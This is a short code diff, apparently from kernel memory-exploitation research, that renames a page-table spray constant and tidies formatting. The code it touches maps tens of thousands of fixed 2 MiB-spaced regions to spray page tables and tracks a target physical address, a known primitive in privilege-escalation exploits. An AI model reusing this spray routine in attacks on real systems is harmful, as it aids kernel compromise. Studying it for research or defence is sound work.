@@ -17,11 +17,11 @@
 
 
 // Size of the virtual-address range covered by one x86-64 4 KiB page table
-inline constexpr std::size_t kX86_64PageTableSpan = 1ULL << 21;  // 2 MiB
+inline constexpr std::size_t kX86_64PageTableSpan = 1ULL << 21; // 2 MiB
 
 #define TARGET_OFFSET 0x10000UL
 
-#define NR_VMA_LIMIT 63000UL
+#define NR_PAGE_TABLES_SPRAY 63000UL
 #define SPRAY_START 0x100000000UL
 
 static int fd_spray;
@@ -34,7 +34,7 @@ static void* target;
 static unsigned long target_phys;
 
 int spray_tables() {
-    for(unsigned i = 0; i < NR_VMA_LIMIT; ++i) {
+    for(unsigned i = 0; i < NR_PAGE_TABLES_SPRAY; ++i) {
         void* addr = (void*)(SPRAY_START + kX86_64PageTableSpan * i);
         if(mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
@@ -48,7 +48,7 @@ int spray_tables() {
 }
 
 void unspray_tables() {
-    for(unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
+    for(unsigned i = 1; i < NR_PAGE_TABLES_SPRAY; ++i) {
         void* addr = (void*)(SPRAY_START + kX86_64PageTableSpan * i);
         if(munmap(addr, PAGE_SIZE)) {
             printf("Failed to unspray tables\n");
@@ -64,7 +64,7 @@ int main(void) {
     int num_rounds       = 100;
     long long total_time = 0;
     int num_fails        = 0;
-    const char* buf = "ffffffffffffffff";
+    const char* buf      = "ffffffffffffffff";
 
     for(int round = 0; round < num_rounds; round++) {
         printf("Round %d\n", round);
